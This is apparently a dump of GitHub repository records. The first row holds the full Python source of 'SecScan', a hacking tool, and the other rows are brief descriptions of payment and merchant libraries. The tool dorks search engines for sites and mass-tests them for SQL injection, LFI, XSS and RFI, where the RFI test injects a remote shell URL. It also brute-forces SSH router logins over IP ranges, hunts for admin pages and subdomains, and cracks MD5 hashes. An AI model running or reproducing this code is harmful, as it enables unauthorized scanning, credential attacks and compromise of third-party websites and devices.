0,https://github.com/udinparla/aa.py.git,"#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3"",              ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7"",              ""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",              ""Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"",              ""YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"", \t     ""Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6"", \t     ""Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3""             ] option = \' \' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     """"""Checks for routers running ssh with given User/Pass""""""     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print \'You need paramiko.\'             print \'http://www.lag.net/paramiko/\'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         """"""Tries to connect to given Ip on port 22""""""         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print ""Working: %s:22 - %s:%s\\n"" % (ip_add, self.user, self.passw)                 write = open(\'Routers.txt\', ""a+"")                 write.write(\'%s:22 %s:%s\\n\' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print \'Not Working: %s:22 - %s:%s\\n\' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     """"""Handles the Ip range creation""""""     def __init__(self):         self.ip_range = []         self.start_ip = raw_input(\'Start ip: \')         self.end_ip = raw_input(\'End ip: \')         self.user = raw_input(\'User: \')         self.passw = raw_input(\'Password: \')         self.iprange()             def iprange(self):         """"""Creates list of Ip\'s from Start_Ip to End_Ip""""""         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(""."")))         end = list(map(int, self.end_ip.split(""."")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(""."".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     """"""Searches for dorks and grabs results""""""     def __init__(self):         if option == \'4\':             self.shell = str(raw_input(\'Shell location: \'))         self.dork = raw_input(\'Enter your dork: \')         self.queue = Queue.Queue()         self.pages = raw_input(\'How many pages(Max 20): \')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         """"""Crawls Ask.com for sites and sends them to appropriate scan""""""         print \'\\nDorking...\'         for i in range(int(self.pages)):             host = ""http://uk.ask.com/web?q=%s&page=%s"" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header(\'User-Agent\', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count(\'_t"" href\', start, end)               while count < numlinks:                 start = source.find(\'_t"" href\', start, end)                 end = source.find(\' onmousedown=""return pk\', start,  end)                 link = source[start+10:end-1].replace(""amp;"","""")                 self.queue.put(link)                 start = end                 end = len(source)                 count = count + 1              self.page += 1          if option == \'1\':             for i in range(10):                 thread = ScanClass(self.queue)                 thread.setDaemon(True)                 thread.start()              self.queue.join()          elif option == \'2\':             for i in range(10):                 thread = LScanClass(self.queue)                 thread.setDaemon(True)                 thread.start()              self.queue.join()          elif option == \'3\':             for i in range(10):                 thread = XScanClass(self.queue)                 thread.setDaemon(True)                 thread.start()              self.queue.join()          elif option == \'4\':             for i in range(10):                 thread = RScanClass(self.queue, self.shell)                 thread.setDaemon(True)                 thread.start()              self.queue.join()      class ScanClass(threading.Thread):     """"""Scans for Sql errors and ouputs to file""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue         self.schar = ""\'""         self.file = \'sqli.txt\'       def run(self):         """"""Scans Url for Sql errors""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 global vuln                 global invuln                 global np                 test = site + self.schar                  try:                     conn = urllib2.Request(test)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(""error in your SQL syntax"", data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'oracle.jdbc.\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'system.data.oledb\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'SQL command net properly ended\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'atoracle.jdbc.\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'java.sql.sqlexception\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'query failed:\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'postgresql.util.\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'mysql_fetch\', data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'Error:unknown\', data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'JET Database Engine\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'Microsoft OLE DB Provider for\', data, re.I)):                         self.mssql(test)                         vuln += 1 \t\t    elif (re.findall(\'mysql_numrows\', data, re.I)):                         self.mysql(test)                         vuln += 1 \t\t    elif (re.findall(\'mysql_num\', data, re.I)):                         self.mysql(test)                         vuln += 1 \t\t    elif (re.findall(\'Invalid Query\', data, re.I)):                         self.mysql(test)                         vuln += 1 \t\t    elif (re.findall(\'FetchRow\', data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'JET Database\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'OLE DB Provider for\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'Syntax error\', data, re.I)):                         self.mssql(test)                         vuln += 1                     else:                         print B+test + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                 np += 1             self.queue.task_done()       def mysql(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + W+url         else:             print O+""MySql: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[SQLI]: \' + url + ""\\n"")             write.close()      def mssql(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file).read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""MsSql: "" + url + W \t    write = open (self.file, ""a+"")             write.write(\'[SQLI]: \' + url + ""\\n"")             write.close()      class LScanClass(threading.Thread):     """"""Scans for Lfi errors and outputs to file""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.file = \'lfi.txt\'         self.queue = queue         self.lchar = \'../\'              def run(self):         """"""Checks Url for File Inclusion errors""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 lsite = site.rsplit(\'=\', 1)[0]                 if lsite[-1] != ""="":                     lsite = lsite + ""=""                 test = lsite + self.lchar                 global vuln                 global invuln                 global np                  try:                     conn = urllib2.Request(test)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                  except:                     self.queue.task_done()                  else:                     if (re.findall(""failed to open stream: No such file or directory"", data, re.I)):                         self.lfi(test)                         vuln += 1                     else:                         print B+test + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                  np += 1               self.queue.task_done()       def lfi(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""Lfi: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[LFI]: \' + url + ""\\n"")             write.close()         class XScanClass(threading.Thread):     """"""Scan for Xss errors and outputs to file""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue         self.xchar = """"""<ScRIpT>alert(\'xssBYm0le\');</ScRiPt>""""""         self.file = \'xss.txt\'       def run(self):         """"""Checks Url for possible Xss""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit(\'=\', 1)[0]                 if xsite[-1] != ""="":                     xsite = xsite + ""=""                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(""xssBYm0le"", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                 np += 1             self.queue.task_done()       def xss(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""Xss: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[XSS]: \' + url + ""\\n"")             write.close()      class RScanClass(threading.Thread):     """"""Scans for Rfi errors and outputs to file""""""     def __init__(self, queue, shell):         threading.Thread.__init__(self)         self.queue = queue         self.file = \'rfi.txt\'         self.shell = shell       def run(self):         """"""Checks Url for Remote File Inclusion vulnerability""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 global vuln                 global invuln                 global np                 rsite = site.rsplit(\'=\', 1)[0]                 if rsite[-1] != ""="":                     rsite = rsite + ""=""                 link = rsite + self.shell + \'?\'                 try:                     conn = urllib2.Request(link)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\'uname -a\', data, re.I)):                         self.rfi(link)                         vuln += 1                     else:                         print B+link + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                 np += 1                     self.queue.task_done()         def rfi(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""Rfi: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[Rfi]: \' + url + ""\\n"")             write.close()           class Atest(threading.Thread):     """"""Checks given site for Admin Pages/Dirs""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue       def run(self):         """"""Checks if Admin Page/Dir exists""""""         while True:             try:                 site = self.queue.get(False)              except Queue.Empty:                 break             try:                 conn = urllib2.Request(site)                 conn.add_header(\'User-Agent\', choice(USER_AGENT))                 opener = urllib2.build_opener()                 opener.open(conn)                 print site                 found.append(site)                 self.queue.task_done()                 except urllib2.URLError:                 self.queue.task_done()   def admin():     """"""Create queue and threads for admin page scans""""""     print \'Need to include http:// and ending /\\n\'     site = raw_input(\'Site: \')     queue  = Queue.Queue()     dirs = [\'admin.php\', \'admin/\', \'en/admin/\', \'administrator/\', \'moderator/\', \'webadmin/\', \'adminarea/\', \'bb-admin/\', \'adminLogin/\', \'admin_area/\', \'panel-administracion/\', \'instadmin/\',              \'memberadmin/\', \'administratorlogin/\', \'adm/\', \'admin/account.php\', \'admin/index.php\', \'admin/login.php\', \'admin/admin.php\', \'admin/account.php\',              \'joomla/administrator\', \'login.php\', \'admin_area/admin.php\' ,\'admin_area/login.php\' ,\'siteadmin/login.php\' ,\'siteadmin/index.php\', \'siteadmin/login.html\',              \'admin/account.html\', \'admin/index.html\', \'admin/login.html\', \'admin/admin.html\', \'admin_area/index.php\', \'bb-admin/index.php\', \'bb-admin/login.php\',              \'bb-admin/admin.php\', \'admin/home.php\', \'admin_area/login.html\', \'admin_area/index.html\', \'admin/controlpanel.php\', \'admincp/index.asp\', \'admincp/login.asp\',              \'admincp/index.html\', \'admin/account.html\', \'adminpanel.html\', \'webadmin.html\', \'webadmin/index.html\', \'webadmin/admin.html\', \'webadmin/login.html\',              \'admin/admin_login.html\', \'admin_login.html\', \'panel-administracion/login.html\', \'admin/cp.php\', \'cp.php\', \'administrator/index.php\', \'cms\', \'administrator/login.php\',             \'nsw/admin/login.php\', \'webadmin/login.php\', \'admin/admin_login.php\', \'admin_login.php\', \'administrator/account.php\' ,\'administrator.php\', \'admin_area/admin.html\',             \'pages/admin/admin-login.php\' ,\'admin/admin-login.php\', \'admin-login.php\', \'bb-admin/index.html\', \'bb-admin/login.html\', \'bb-admin/admin.html\', \'admin/home.html\',             \'modelsearch/login.php\', \'moderator.php\', \'moderator/login.php\', \'moderator/admin.php\', \'account.php\', \'pages/admin/admin-login.html\', \'admin/admin-login.html\',             \'admin-login.html\', \'controlpanel.php\', \'admincontrol.php\', \'admin/adminLogin.html\' ,\'adminLogin.html\', \'admin/adminLogin.html\', \'home.html\',             \'rcjakar/admin/login.php\', \'adminarea/index.html\', \'adminarea/admin.html\', \'webadmin.php\', \'webadmin/index.php\', \'webadmin/admin.php\', \'admin/controlpanel.html\',             \'admin.html\', \'admin/cp.html\', \'cp.html\', \'adminpanel.php\', \'moderator.html\', \'administrator/index.html\', \'administrator/login.html\', \'user.html\',             \'administrator/account.html\', \'administrator.html\', \'login.html\', \'modelsearch/login.html\', \'moderator/login.html\', \'adminarea/login.html\',             \'panel-administracion/index.html\', \'panel-administracion/admin.html\', \'modelsearch/index.html\', \'modelsearch/admin.html\', \'admincontrol/login.html\',             \'adm/index.html\', \'adm.html\', \'moderator/admin.html\', \'user.php\', \'account.html\', \'controlpanel.html\', \'admincontrol.html\', \'panel-administracion/login.php\',             \'wp-login.php\', \'wp-admin\', \'typo3\', \'adminLogin.php\', \'admin/adminLogin.php\', \'home.php\',\'adminarea/index.php\' ,\'adminarea/admin.php\' ,\'adminarea/login.php\',             \'panel-administracion/index.php\', \'panel-administracion/admin.php\', \'modelsearch/index.php\', \'modelsearch/admin.php\', \'admincontrol/login.php\',             \'adm/admloginuser.php\', \'admloginuser.php\', \'admin2.php\', \'admin2/login.php\', \'admin2/index.php\', \'adm/index.php\', \'adm.php\', \'affiliate.php\',\'admin/admin.asp\',\'admin/login.asp\',\'admin/index.asp\',\'admin/admin.aspx\',\'admin/login.aspx\',\'admin/index.aspx\',\'admin/webmaster.asp\',\'admin/webmaster.aspx\',\'asp/admin/index.asp\',\'asp/admin/index.aspx\',\'asp/admin/admin.asp\',\'asp/admin/admin.aspx\',\'asp/admin/webmaster.asp\',\'asp/admin/webmaster.aspx\',\'admin/\',\'login.asp\',\'login.aspx\',\'admin.asp\',\'admin.aspx\',\'webmaster.aspx\',\'webmaster.asp\',\'login/index.asp\',\'login/index.aspx\',\'login/login.asp\',\'login/login.aspx\',\'login/admin.asp\',\'login/admin.aspx\',\'administracion/index.asp\',\'administracion/index.aspx\',\'administracion/login.asp\',\'administracion/login.aspx\',\'administracion/webmaster.asp\',\'administracion/webmaster.aspx\',\'administracion/admin.asp\',\'administracion/admin.aspx\',\'php/admin/\',\'admin/admin.php\',\'admin/index.php\',\'admin/login.php\',\'admin/system.php\',\'admin/ingresar.php\',\'admin/administrador.php\',\'admin/default.php\',\'administracion/\',\'administracion/index.php\',\'administracion/login.php\',\'administracion/ingresar.php\',\'administracion/admin.php\',\'administration/\',\'administration/index.php\',\'administration/login.php\',\'administrator/index.php\',\'administrator/login.php\',\'administrator/system.php\',\'system/\',\'system/login.php\',\'admin.php\',\'login.php\',\'administrador.php\',\'administration.php\',\'administrator.php\',\'admin1.html\',\'admin1.php\',\'admin2.php\',\'admin2.html\',\'yonetim.php\',\'yonetim.html\',\'yonetici.php\',\'yonetici.html\',\'adm/\',\'admin/account.php\',\'admin/account.html\',\'admin/index.html\',\'admin/login.html\',\'admin/home.php\',\'admin/controlpanel.html\',\'admin/controlpanel.php\',\'admin.html\',\'admin/cp.php\',\'admin/cp.html\',\'cp.php\',\'cp.html\',\'administrator/\',\'administrator/index.html\',\'administrator/login.html\',\'administrator/account.html\',\'administrator/account.php\',\'administrator.html\',\'login.html\',\'modelsearch/login.php\',\'moderator.php\',\'moderator.html\',\'moderator/login.php\',\'moderator/login.html\',\'moderator/admin.php\',\'moderator/admin.html\',\'moderator/\',\'account.php\',\'account.html\',\'controlpanel/\',\'controlpanel.php\',\'controlpanel.html\',\'admincontrol.php\',\'admincontrol.html\',\'adminpanel.php\',\'adminpanel.html\',\'admin1.asp\',\'admin2.asp\',\'yonetim.asp\',\'yonetici.asp\',\'admin/account.asp\',\'admin/home.asp\',\'admin/controlpanel.asp\',\'admin/cp.asp\',\'cp.asp\',\'administrator/index.asp\',\'administrator/login.asp\',\'administrator/account.asp\',\'administrator.asp\',\'modelsearch/login.asp\',\'moderator.asp\',\'moderator/login.asp\',\'moderator/admin.asp\',\'account.asp\',\'controlpanel.asp\',\'admincontrol.asp\',\'adminpanel.asp\',\'fileadmin/\',\'fileadmin.php\',\'fileadmin.asp\',\'fileadmin.html\',\'administration.html\',\'sysadmin.php\',\'sysadmin.html\',\'phpmyadmin/\',\'myadmin/\',\'sysadmin.asp\',\'sysadmin/\',\'ur-admin.asp\',\'ur-admin.php\',\'ur-admin.html\',\'ur-admin/\',\'Server.php\',\'Server.html\',\'Server.asp\',\'Server/\',\'wp-admin/\',\'administr8.php\',\'administr8.html\',\'administr8/\',\'administr8.asp\',\'webadmin/\',\'webadmin.php\',\'webadmin.asp\',\'webadmin.html\',\'administratie/\',\'admins/\',\'admins.php\',\'admins.asp\',\'admins.html\',\'administrivia/\',\'Database_Administration/\',\'WebAdmin/\',\'useradmin/\',\'sysadmins/\',\'admin1/\',\'system-administration/\',\'administrators/\',\'pgadmin/\',\'directadmin/\',\'staradmin/\',\'ServerAdministrator/\',\'SysAdmin/\',\'administer/\',\'LiveUser_Admin/\',\'sys-admin/\',\'typo3/\',\'panel/\',\'cpanel/\',\'cPanel/\',\'cpanel_file/\',\'platz_login/\',\'rcLogin/\',\'blogindex/\',\'formslogin/\',\'autologin/\',\'support_login/\',\'meta_login/\',\'manuallogin/\',\'simpleLogin/\',\'loginflat/\',\'utility_login/\',\'showlogin/\',\'memlogin/\',\'members/\',\'login-redirect/\',\'sub-login/\',\'wp-login/\',\'login1/\',\'dir-login/\',\'login_db/\',\'xlogin/\',\'smblogin/\',\'customer_login/\',\'UserLogin/\',\'login-us/\',\'acct_login/\',\'admin_area/\',\'bigadmin/\',\'project-admins/\',\'phppgadmin/\',\'pureadmin/\',\'sql-admin/\',\'radmind/\',\'openvpnadmin/\',\'wizmysqladmin/\',\'vadmind/\',\'ezsqliteadmin/\',\'hpwebjetadmin/\',\'newsadmin/\',\'adminpro/\',\'Lotus_Domino_Admin/\',\'bbadmin/\',\'vmailadmin/\',\'Indy_admin/\',\'ccp14admin/\',\'irc-macadmin/\',\'banneradmin/\',\'sshadmin/\',\'phpldapadmin/\',\'macadmin/\',\'administratoraccounts/\',\'admin4_account/\',\'admin4_colon/\',\'radmind-1/\',\'Super-Admin/\',\'AdminTools/\',\'cmsadmin/\',\'SysAdmin2/\',\'globes_admin/\',\'cadmins/\',\'phpSQLiteAdmin/\',\'navSiteAdmin/\',\'server_admin_small/\',\'logo_sysadmin/\',\'server/\',\'database_administration/\',\'power_user/\',\'system_administration/\',\'ss_vms_admin_sm/\']          for add in dirs:         test = site + add         queue.put(test)              for i in range(20):         thread = Atest(queue)         thread.setDaemon(True)         thread.start()      queue.join()  def aprint():     """"""Print results of admin page scans""""""     print \'Search Finished\\n\'     if len(found) == 0:         print \'No pages found\'     else:         for site in found:             print O+\'Found: \' + G+site + W          class SDtest(threading.Thread):     """"""Checks given Domain for Sub Domains""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue       def run(self):         """"""Checks if Sub Domain responds""""""         while True:             try:                 domain = self.queue.get(False)             except Queue.Empty:                 break             try:                 site = \'http://\' + domain                 conn = urllib2.Request(site)                 conn.add_header(\'User-Agent\', choice(USER_AGENT))                 opener = urllib2.build_opener()                 opener.open(conn)             except urllib2.URLError:                 self.queue.task_done()             else:                 target = socket.gethostbyname(domain)                   print \'Found: \' + site + \' - \' + target                 self.queue.task_done()            def subd():     """"""Create queue and threads for sub domain scans""""""     queue = Queue.Queue()     site = raw_input(\'Domain: \')     sub = [""admin"", ""access"", ""accounting"", ""accounts"", ""admin"", ""administrator"", ""aix"", ""ap"", ""archivos"", ""aula"", ""aulas"", ""ayuda"", ""backup"", ""backups"", ""bart"", ""bd"", ""beta"", ""biblioteca"",             ""billing"", ""blackboard"", ""blog"", ""blogs"", ""bsd"", ""cart"", ""catalog"", ""catalogo"", ""catalogue"", ""chat"", ""chimera"", ""citrix"", ""classroom"", ""clientes"", ""clients"", ""carro"",             ""connect"", ""controller"", ""correoweb"", ""cpanel"", ""csg"", ""customers"", ""db"", ""dbs"", ""demo"", ""demon"", ""demostration"", ""descargas"", ""developers"", ""development"", ""diana"",             ""directory"", ""dmz"", ""domain"", ""domaincontroller"", ""download"", ""downloads"", ""ds"", ""eaccess"", ""ejemplo"", ""ejemplos"", ""email"", ""enrutador"", ""example"", ""examples"", ""exchange"",             ""eventos"", ""events"", ""extranet"", ""files"", ""finance"", ""firewall"", ""foro"", ""foros"", ""forum"", ""forums"", ""ftp"", ""ftpd"", ""fw"", ""galeria"", ""gallery"", ""gateway"", ""gilford"",             ""groups"", ""groupwise"", ""guia"", ""guide"", ""gw"", ""help"", ""helpdesk"", ""hera"", ""heracles"", ""hercules"", ""home"", ""homer"", ""hotspot"", ""hypernova"", ""images"", ""imap"", ""imap3"", ""imap3d"",             ""imapd"", ""imaps"", ""imgs"", ""imogen"", ""inmuebles"", ""internal"", ""intranet"", ""ipsec"", ""irc"", ""ircd"", ""jabber"", ""laboratorio"", ""lab"", ""laboratories"", ""labs"", ""library"", ""linux"", ""lisa"",  ""login"", ""logs"", ""mail"", ""mailgate"", ""manager"", ""marketing"", ""members"", ""mercury"", ""meta"", ""meta01"", ""meta02"", ""meta03"", ""miembros"", ""minerva"", ""mob"", ""mobile"", ""moodle"", ""movil"",             ""mssql"", ""mx"", ""mx0"", ""mx1"", ""mx2"", ""mx3"", ""mysql"", ""nelson"", ""neon"", ""netmail"", ""news"", ""novell"", ""ns"", ""ns0"", ""ns1"", ""ns2"", ""ns3"", ""online"", ""oracle"", ""owa"", ""partners"", ""pcanywhere"",             ""pegasus"", ""pendrell"", ""personal"", ""photo"", ""photos"", ""pop"", ""pop3"", ""portal"", ""postman"", ""postmaster"", ""private"", ""proxy"", ""prueba"", ""pruebas"", ""public"", ""ras"", ""remote"", ""reports"", ""research"",             ""restricted"", ""robinhood"", ""router"", ""rtr"", ""sales"", ""sample"", ""samples"", ""sandbox"", ""search"", ""secure"", ""seguro"", ""server"", ""services"", ""servicios"", ""servidor"", ""shop"", ""shopping"",             ""smtp"", ""socios"", ""soporte"", ""squirrel"", ""squirrelmail"", ""ssh"", ""staff"", ""sms"", ""solaris"", ""sql"", ""stats"", ""sun"", ""support"", ""test"", ""tftp"", ""tienda"", ""unix"", ""upload"", ""uploads"",             ""ventas"", ""virtual"", ""vista"", ""vnc"", ""vpn"", ""vpn1"", ""vpn2"", ""vpn3"", ""wap"", ""web1"", ""web2"", ""web3"", ""webct"", ""webadmin"", ""webmail"", ""webmaster"", ""win"", ""windows"", ""www"", ""ww0"", ""ww1"",             ""ww2"", ""ww3"", ""www0"", ""www1"", ""www2"", ""www3"", ""xanthus"", ""zeus""]      for check in sub:         test = check + \'.\' + site         queue.put(test)              for i in range(20):         thread = SDtest(queue)         thread.setDaemon(True)         thread.start()      queue.join()   class Cracker(threading.Thread):     """"""Use a wordlist to try and brute the hash""""""     def __init__(self, queue, hashm):         threading.Thread.__init__(self)         self.queue = queue         self.hashm = hashm      def run(self):          """"""Hash word and check against hash""""""         while True:             try:                 word = self.queue.get(False)             except Queue.Empty:                 break             tmp = hashlib.md5(word).hexdigest()             if tmp == self.hashm:                 self.result(word)                self.queue.task_done()       def result(self, words):         """"""Print result if found""""""         print self.hashm + \' = \' + words  def word():     """"""Create queue and threads for hash crack""""""     queue = Queue.Queue()     wordlist = raw_input(\'Wordlist: \')     hashm = raw_input(\'Enter Md5 hash: \')     read = open(wordlist)     for words in read:         words = words.replace(""\\n"","""")         queue.put(words)            read.close()     for i in range(5):         thread = Cracker(queue, hashm)         thread.setDaemon(True)         thread.start()     queue.join()   class OnlineCrack:     """"""Use online service to check for hash""""""      def crack(self):         """"""Connect and check hash""""""         hashm = raw_input(\'Enter MD5 Hash: \')         conn = urllib2.Request(\'http://md5.hashcracking.com/search.php?md5=%s\' % (hashm))         conn.add_header(\'User-Agent\', choice(USER_AGENT))         opener = urllib2.build_opener()         opener.open(conn)         data = opener.open(conn).read()         if data == \'No results returned.\':             print \'\\n- Not found or not valid -\'         else:             print \'\\n- %s -\' % (data)   class Check:     """"""Check your current IP address""""""      def grab(self):         """"""Connect to site and grab IP""""""         site = \'http://www.tracemyip.org/\'         try:             conn = urllib2.Request(site)             conn.add_header(\'User-Agent\', choice(USER_AGENT))             opener = urllib2.build_opener()             opener.open(conn)             data = opener.open(conn).read()               start = 0             end = len(data)                  start = data.find(\'onClick=""\', start, end)             end = data.find(\'size=\', start, end)                ip_add = data[start+46:end-2].strip()             print \'\\nYour current Ip address is %s\' % (ip_add)                  except urllib2.HTTPError:             print \'Error connecting\'       def output():     """"""Outputs dork scan results to screen""""""     print \'\\n>> \' + str(vuln) + G+\' Vulnerable Sites Found\' + W     print \'>> \' + str(invuln) + G+\' Sites Not Vulnerable\' + W     print \'>> \' + str(np) + R+\' Sites Without Parameters\' + W     if option == \'1\':         print \'>> Output Saved To sqli.txt\\n\'     elif option == \'2\':         print \'>> Output Saved To lfi.txt\'     elif option == \'3\':         print \'>> Output Saved To xss.txt\'     elif option == \'4\':         print \'>> Output Saved To rfi.txt\'     W  = ""\\033[0m"";   R  = ""\\033[31m"";  G  = ""\\033[32m"";  O  = ""\\033[33m"";  B  = ""\\033[34m"";  def main():     """"""Outputs Menu and gets input""""""     quotes = [ \t\'\\nm0le@tormail.org\\n\'         ]     print (O+\'\'\' ------------- -- SecScan -- --- v1.5 ---- ---- by ----- --- m0le ---- -------------\'\'\')     print (G+\'\'\' -[1]-  SQLi -[2]-  LFI -[3]-  XSS -[4]-  RFI -[5]-  Proxy -[6]-  Admin Page Finder -[7]-  Sub Domain Scan -[8]-  Dictionary MD5 cracker -[9]-  Online MD5 cracker -[10]- Check your IP address\'\'\')      print (B+\'\'\' -[!]- If freeze while running or want to quit,  just Ctrl C, it will automatically terminate the job. \'\'\')     print W     global option     option = raw_input(\'Enter Option: \')       if option:         if option == \'1\':             Crawl()             output()             print choice(quotes)                      elif option == \'2\':             Crawl()             output()             print choice(quotes)           elif option == \'3\':             Crawl()             output()             print choice(quotes)           elif option == \'4\':             Crawl()             output()             print choice(quotes)               elif option == \'5\':             Ip()             print choice(quotes)           elif option == \'6\':             admin()             aprint()             print choice(quotes)          elif option == \'7\':             subd()             print choice(quotes)          elif option == \'8\':             word()             print choice(quotes)            elif option == \'9\':             OnlineCrack().crack()             print choice(quotes)                              elif option == \'10\':             Check().grab()               print choice(quotes)                 else:             print R+\'\\nInvalid Choice\\n\' + W             time.sleep(0.9)             main()           else:         print R+\'\\nYou Must Enter An Option (Check if your typo is corrected.)\\n\' + W         time.sleep(0.9)         main()     if __name__ == \'__main__\':     main()",,7
0,https://github.com/icos-urenio/virtual-city-market.git,Empowers the city local marketplace by bringing together customers and merchants.,,6
0,https://github.com/hiqdev/omnipay-robokassa.git,RoboKassa plugin for PHP merchant library,hacktoberfest,6
0,https://github.com/sellerated/fba_fee_calculator.git,Calculates Amazon FBA Fees for Merchants,,6
0,https://github.com/LilleJohs/UseNano.org.git,Usenano.org is a website that lists all merchants that accept Nano as payment.,,6
0,https://github.com/arcticfalcon/emv-qr-cps.git,EMV QR Code Specification for Payment Systems: Merchant-Presented Mode,,6
0,https://github.com/square/active_merchant_square.git,"{""Square's e-commerce API support added to Active Merchant. (This depends on core active merchant, so it can coexist peacefully with upstream changes there. Not merged into Active Merchant for reasons as described here https://github.com/activemerchant/active_merchant/pull/2242)  See example below, and our blog post: https://medium.com/square-corner-blog/activemerchantsquare-for-squares-e-commerce-api-111ea63e530a""}",,6
0,https://github.com/Cybermaxke/MerchantsAPI.git,A simple merchants api for the bukkit api.,"bukkit-api,plugin,minecraft,java",6
0,https://github.com/CoinifySoftware/php-sdk.git,A PHP wrapper for Coinify merchant API and callbacks,,6
0,https://github.com/ringkubd/AbKash.git,A laravel package for bKash merchant  transaction verification,"laravel,payment-gateway,bkash-online-payment,bkash,api,laravel-payments",6
0,https://github.com/geopayme/btcMarketPlace.git,"{""Geopay's Merchant MarketPlace""}",,6
